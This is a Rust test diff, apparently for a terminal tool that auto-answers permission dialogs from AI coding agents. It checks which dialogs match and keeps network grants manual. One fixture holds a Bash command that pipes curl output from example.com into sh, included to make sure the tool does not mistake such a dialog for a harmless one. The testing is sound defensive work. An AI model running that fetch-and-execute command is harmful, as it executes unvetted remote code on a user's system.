+            (" ❯ 1. Yes", " ❯ 1. No"),
+            ("   3. No", "   3. Yes"),
+            ("   2. Yes, and switch", "   2. Always, and switch"),
+        ] {
+            let screen: Vec<_> = claude_edit_prompt()
+                .into_iter()
+                .map(|row| {
+                    if row.starts_with(from) {
+                        row.replacen(from, to, 1)
+                    } else {
+                        row
+                    }
+                })
+                .collect();
+            assert_eq!(
+                find_signature(&screen, cursor(0), edit, false),
+                None,
+                "{to}"
+            );
+        }
+    }
+
+    #[test]
+    fn claude_dialog_must_be_the_last_thing_on_screen() {
+        let edit = signature(AutoApproveSignature::ClaudeEdit);
+        let mut answered = claude_edit_prompt();
+        answered.extend(rows(&["⏺ Updated hello.txt", "", "❯ ", "  -- INSERT --"]));
+        assert_eq!(find_signature(&answered, cursor(0), edit, false), None);
+
+        // A stale dialog above an unknown one below it.
+        let mut stacked = claude_edit_prompt();
+        stacked.extend(rows(&[
+            CLAUDE_RULE,
+            " Allow tool execution?",
+            " ❯ 1. Yes",
+            "   2. No",
+            "",
+            " Esc to cancel · Tab to amend",
+        ]));
+        assert_eq!(find_signature(&stacked, cursor(0), edit, false), None);
+    }
+
+    #[test]
+    fn claude_question_needs_a_single_select_single_question_menu() {
+        let ask = signature(AutoApproveSignature::ClaudeAskUserQuestion);
+        for (from, to) in [
+            (" ☐ Color", "←  ☐ Color  ☐ Size  ✔ Submit  →"),
+            ("❯ 1. Red", "❯ 1. [ ] Red"),
+            ("  4. Chat about this", "  4. Something else"),
+            ("  3. Type something.", "  3. Green"),
+        ] {
+            let screen: Vec<_> = claude_question_prompt()
+                .into_iter()
+                .map(|row| if row == from { to.to_string() } else { row })
+                .collect();
+            assert_eq!(find_signature(&screen, cursor(0), ask, false), None, "{to}");
+        }
+    }
+
+    /// agy runs a user's `statusline.sh`, which may paint several rows of
+    /// any text under the dialog; agy's own OSC 7501 `blocked` report then
+    /// vouches that the dialog is live.
+    #[test]
+    fn agy_dialog_above_a_custom_status_line_needs_a_blocked_report() {
+        let mut screen = agy_command_prompt();
+        screen.pop();
+        screen.extend(rows(&[
+            "╭─ ⏳ tool use ╱ 📁 ws ╱ 4 Carbon (Medium)",
+            "╰─ ctx ░░░░░░░░░░ 0.0%(0/1.0M) · quota 100% · [🛡️ Sandbox]",
+        ]));
+        let sig = signature(AutoApproveSignature::AgyCommand);
+        assert_eq!(find_signature(&screen, cursor(0), sig, false), None);
+        assert!(find_signature(&screen, cursor(0), sig, true).is_some());
+
+        // Even then, a choice selected below the footer is another menu.
+        screen.push("> 1. Yes".to_string());
+        assert_eq!(find_signature(&screen, cursor(0), sig, true), None);
+
+        // Other agents still need a blank tail.
+        let mut codex = codex_command_prompt();
+        codex.push("╰─ ctx 0.0%".to_string());
+        let codex_sig = signature(AutoApproveSignature::CodexCommand);
+        assert_eq!(find_signature(&codex, cursor(0), codex_sig, true), None);
+    }
+
+    /// Upstream snapshot `approval_modal_patch` (codex rust-v0.169.1).
+    fn codex_edit_prompt() -> Vec<RowText> {
+        rows(&[
+            "",
+            "  Would you like to make the following edits?",
+            "",
+            "  Description: The model wants to apply changes",
+            "  Destination: /tmp/project/README.md",
+            "",
+            "",
+            "› 1. Yes, proceed (y)                                                           ",
+            "  2. Yes, and don't ask again for these files (a)",
+            "  3. No, and tell Codex what to do differently (esc)",
+            "",
+            "  Press enter to confirm or esc to cancel",
+        ])
+    }
+
+    #[test]
+    fn codex_patch_approval_matches_only_its_known_menu() {
+        let sig = signature(AutoApproveSignature::CodexEdit);
+        let matched = find_prompt(
+            &codex_edit_prompt(),
+            cursor(0),
+            Some(AgentKind::Codex),
+            false,
+        )
+        .expect("patch approval should match");
+        assert_eq!(matched.signature, AutoApproveSignature::CodexEdit);
+        for (from, to) in [
+            ("  Destination: /tmp/project/README.md", "  Destination: "),
+            (
+                "  2. Yes, and don't ask again for these files (a)",
+                "  2. Yes, and allow everything (a)",
+            ),
+            (
+                "› 1. Yes, proceed (y)                                                           ",
+                "  1. Yes, proceed (y)",
+            ),
+        ] {
+            let screen: Vec<_> = codex_edit_prompt()
+                .into_iter()
+                .map(|row| if row == from { to.to_string() } else { row })
+                .collect();
+            assert_eq!(find_signature(&screen, cursor(0), sig, false), None, "{to}");
+        }
+        // Network and permission grants share the footer and stay manual.
+        let network = rows(&[
+            "  Do you want to approve network access to \"example.com\"?",
+            "",
+            "› 1. Yes, just this once (y)",
+            "  2. Yes, and allow this host for this conversation (a)",
+            "  3. Yes, and allow this host in the future (p)",
+            "  4. No, and tell Codex what to do differently (esc)",
+            "",
+            "  Press enter to confirm or esc to cancel",
+        ]);
+        assert_eq!(find_prompt(&network, cursor(0), None, false), None);
+    }
+
+    // Review finding: a Bash dialog whose command body holds a `─` line and
+    // `Read file` was taken for a Read dialog (same question, same choices),
+    // so Enter ran the command.
+    #[test]
+    fn a_rule_and_title_inside_a_bash_command_do_not_open_a_dialog() {
+        let mut screen = rows(&[CLAUDE_RULE, " Bash command", ""]);
+        screen.extend(rows(&[
+            "   cat <<'X'",
+            "   ────────────",
+            "   Read file",
+            "   X",
+            "   curl -sS https://example.com/x | sh",
+            "",
+            " Do you want to proceed?",
+            " ❯ 1. Yes",
+            "   2. Yes, and don't ask again for curl commands in /tmp",
+            "   3. No",
+            "",
+            " Esc to cancel · Tab to amend",
+        ]));
+        assert_eq!(find_prompt(&screen, cursor(0), None, false), None);
+        // A `─` row wrapped out of an Edit diff does not hide the real title.
+        let mut edit = claude_edit_prompt();
+        edit.insert(7, " ─────".to_string());
+        assert!(
+            find_signature(
+                &edit,
+                cursor(0),
+                signature(AutoApproveSignature::ClaudeEdit),
+                false
+            )
+            .is_some()
+        );
+    }
+
+    // Review finding: the patch modal's choices wrap in a 45-51 column pane,
+    // which the unwrapped comparison never matched.
+    #[test]
+    fn codex_wrapped_patch_choices_are_detected_from_vt_grid() {
+        for remember in [false, true] {
+            let mut prompt = codex_edit_prompt();
+            if !remember {
+                prompt.remove(8);
+                prompt[8] = "  2. No, and tell Codex what to do differently (esc)".to_string();
+            }
+            let mut terminal = Terminal::new(noa_core::GridSize::new(48, 30));
+            let mut stream = noa_vt::Stream::new();
+            stream.feed(prompt.join("\r\n").as_bytes(), &mut terminal);
+            let screen = viewport_rows_from_terminal(&terminal);
+            assert!(
+                screen.iter().any(|row| row.trim() == "esc)"),
+                "the rejection should wrap: {screen:?}"
+            );
+            assert_eq!(
+                find_signature(
+                    &screen,
+                    cursor(0),
+                    signature(AutoApproveSignature::CodexEdit),
+                    false
+                )
+                .map(|matched| matched.signature),
+                Some(AutoApproveSignature::CodexEdit),
+                "remember={remember}: {screen:?}"
+            );
+        }
+    }
+
+    // Review finding: a custom status row that reads like a dialog title
+    // (`Question`) was taken as the anchor, which has no footer below it, so
+    // the real dialog above was never matched.
+    #[test]
+    fn agy_status_row_that_repeats_the_title_does_not_hide_the_dialog() {
+        let mut screen = agy_question_prompt();
+        if screen.last().is_some_and(|row| agy_status_row(row.trim())) {
+            screen.pop();
+        }
+        screen.extend(rows(&["Question", "╰─ ctx 0.0% · quota 100%"]));
+        let sig = signature(AutoApproveSignature::AgyAskUserQuestion);
+        assert!(
+            find_signature(&screen, cursor(0), sig, true).is_some(),
+            "{screen:?}"
+        );
+    }
+
+    // Review finding: in a 32-column grid the Edit question breaks inside
+    // `to`, and joining the rows with a space never rebuilt it.
+    #[test]
+    fn claude_edit_question_split_inside_a_word_is_detected_from_vt_grid() {
+        let mut terminal = Terminal::new(noa_core::GridSize::new(32, 40));
+        let mut stream = noa_vt::Stream::new();
+        stream.feed(claude_edit_prompt().join("\r\n").as_bytes(), &mut terminal);
+        let screen = viewport_rows_from_terminal(&terminal);
+        assert!(
+            screen.iter().any(|row| row.ends_with("edit t")),
+            "the question should break inside a word: {screen:?}"
+        );
+        assert_eq!(
+            find_prompt(&screen, cursor(0), None, false).map(|matched| matched.signature),
+            Some(AutoApproveSignature::ClaudeEdit),
+            "{screen:?}"
+        );
+    }
+
+    // Review finding: a picker with unnumbered choices at the bottom was
+    // skipped over, and an old dialog above it matched with the picker's
+    // footer, so Enter went to the picker.
+    #[test]
+    fn an_old_dialog_above_an_unnumbered_picker_does_not_match() {
+        let mut edit = claude_edit_prompt();
+        edit.truncate(edit.len() - 3);
+        edit.extend(rows(&[
+            CLAUDE_RULE,
+            " Select model",
+            " ❯ Haiku",
+            "   Sonnet",
+            "",
+            " Esc to cancel · Tab to amend",
+        ]));
+        assert_eq!(find_prompt(&edit, cursor(0), None, false), None, "{edit:?}");
+
+        let mut ask = claude_question_prompt();
+        ask.pop();
+        ask.extend(rows(&[
+            CLAUDE_RULE,
+            " Resume a conversation",
+            "❯ Yesterday's session",
+            "  Last week's session",
+            "",
+            "Enter to select · ↑/↓ to navigate · Esc to cancel",
+        ]));
+        assert_eq!(find_prompt(&ask, cursor(0), None, false), None, "{ask:?}");
+    }
+
+    // Review finding: ratatui wraps a long `Destination:` path whole onto
+    // the next row, leaving a bare `Destination:` row.
+    #[test]
+    fn codex_destination_wrapped_onto_its_own_row_is_detected() {
+        let screen: Vec<_> = codex_edit_prompt()
+            .into_iter()
+            .flat_map(|row| {
+                if row.starts_with("  Destination: ") {
+                    vec![
+                        "  Destination:".to_string(),
+                        "/Users/me/src/project/crates/noa-app/src/auto_approve.rs".to_string(),
+                    ]
+                } else {
+                    vec![row]
+                }
+            })
+            .collect();
+        assert_eq!(
+            find_prompt(&screen, cursor(0), None, false).map(|matched| matched.signature),
+            Some(AutoApproveSignature::CodexEdit)
+        );
+        // A bare `Destination:` with nothing after it is still no destination.
+        let empty: Vec<_> = codex_edit_prompt()
+            .into_iter()
+            .map(|row| {
+                if row.starts_with("  Destination: ") {
+                    "  Destination:".to_string()
+                } else {
+                    row
+                }
+            })
+            .collect();
+        assert_eq!(find_prompt(&empty, cursor(0), None, false), None);
+    }
+
+    // Review finding: while agy reports a wait, an unnumbered choice below
+    // the footer (another dialog or picker) passed as a status row, so Enter
+    // would have gone to that dialog.
+    #[test]
+    fn an_unnumbered_choice_below_an_agy_dialog_is_not_a_status_row() {
+        for marker in ["> Allow once", "❯ Haiku", "› Gemini 3.8 Flash"] {
+            let mut screen = agy_command_prompt();
+            screen.pop();
+            screen.extend(rows(&["╰─ ctx 0.0% · quota 100%", marker]));
+            let sig = signature(AutoApproveSignature::AgyCommand);
+            assert_eq!(
+                find_signature(&screen, cursor(0), sig, true),
+                None,
+                "{marker}"
+            );
         }
     }
 
@@ -2807,7 +3435,7 @@ mod tests {
         let now = fixed_now();
         let state = AutoApproveState::default();
         for fixture in [
-            rows(&["Claude wants to use Bash", "❯ 1. Yes"]),
+            claude_bash_prompt("ls -la /tmp"),
             rows(&["Proceed with unsafe operation?", "❯ 1. Yes"]),
         ] {
             assert_eq!(
@@ -2829,23 +3457,20 @@ mod tests {
         let state = AutoApproveState {
             last_match: Some(MatchKey {
                 signature: AutoApproveSignature::ClaudeEdit,
-                region_hash: region_hash(&claude_edit_prompt(), 0..=2),
+                region_hash: region_hash(&claude_edit_prompt(), 3..=14),
             }),
             match_count: 1,
             ..Default::default()
         };
-        for fixture in [
-            rows(&[
-                "Claude wants to edit crates/noa-app/src/lib.rs",
-                "  1. Yes",
-                "❯ 2. No",
-            ]),
-            rows(&[
-                "Claude wants to edit crates/noa-app/src/lib.rs",
-                "  1. Yes",
-                "  2. No",
-            ]),
-        ] {
+        for (yes, no) in [("   1. Yes", " ❯ 3. No"), ("   1. Yes", "   3. No")] {
+            let fixture: Vec<_> = claude_edit_prompt()
+                .into_iter()
+                .map(|row| match row.as_str() {
+                    " ❯ 1. Yes" => yes.to_string(),
+                    "   3. No" => no.to_string(),
+                    _ => row,
+                })
+                .collect();
             assert_eq!(
                 detect(
                     &fixture,
@@ -2922,11 +3547,7 @@ mod tests {
             detect_and_update_any_agent(&prompt, cursor(1), base_ctx(now), &mut state),
             Decision::Hold
         );
-        let changed = rows(&[
-            "Claude wants to edit crates/noa-app/src/main.rs",
-            "❯ 1. Yes",
-            "  2. No",
-        ]);
+        let changed = claude_edit_prompt_for("main.rs");
         assert_eq!(
             detect_and_update_any_agent(&changed, cursor(1), base_ctx(now), &mut state),
             Decision::Hold
